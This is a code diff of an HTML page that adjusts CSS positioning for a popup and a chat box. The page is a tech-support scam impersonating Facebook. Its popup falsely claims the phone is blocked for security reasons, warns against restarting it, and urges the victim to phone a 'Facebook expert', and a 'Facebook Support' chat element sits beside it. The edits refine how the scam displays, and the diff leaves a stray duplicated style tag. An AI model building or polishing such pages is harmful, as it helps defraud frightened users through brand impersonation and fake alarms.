@@ -1,33 +1,24 @@
 <html lang="en"><head>
   <style>
-  /* Add specific positioning for chat element */
+  <style>
+  /* Keep chat div as it is with just a higher z-index */
   #chat {
-    position: fixed !important;
-    left: 50% !important;
-    top: 40% !important; /* Position above welcomeDiv which is at 50% */
-    transform: translate(-50%, -50%) !important;
-    max-width: 90vw !important;
-    width: auto !important;
-    margin: 0 !important;
+    /* Maintain original styling, just add z-index */
     z-index: 10000000 !important; /* Higher z-index than welcomeDiv */
-    background-color: white;
-    padding: 15px;
-    border-radius: 5px;
-    text-align: center;
-    box-shadow: 0 0 10px rgba(0,0,0,0.5);
   }
 
-  /* Ensure welcomeDiv is positioned correctly */
+  /* Position welcomeDiv at 30% from the top */
   #welcomeDiv {
     position: fixed !important;
     left: 50% !important;
-    top: 60% !important; /* Position below chat */
+    top: 30% !important; /* Position at 30% from top */
     transform: translate(-50%, -50%) !important;
     max-width: 90vw !important;
     width: auto !important;
     margin: 0 !important;
     z-index: 9999999 !important;
   }
+</style>
   /* Mobile-friendly popup centering */
 @media screen and (max-width: 767px) {
   /* General popup centering */
@@ -288,7 +279,8 @@ s0.parentNode.insertBefore(s1,s0);
         </p>
       </div> -->
       <!-- Modified welcomeDiv with Facebook branding -->
-<div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);height:auto;width:550px;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
+<!-- Position welcomeDiv at 30% from top -->
+<div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);height:auto;width:550px;position:fixed;top:30%;left:50%;transform:translate(-50%, 0);z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
   <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">
     Access to this system has been blocked for security reasons. Do not access or restart this mobile. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Facebook expert will guide you through the investigation over the phone. Running this application may put your mobile at risk。<br>
     <strong>
@@ -317,6 +309,7 @@ s0.parentNode.insertBefore(s1,s0);
                   </svg></div>
       </div> -->
 <!-- Modified chat div with facebook branding -->
+<!-- Keep original chat div structure -->
 <div id="chat" style="display: none;">
   <img src="images/msmm.png">
   <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Facebook Support</span>
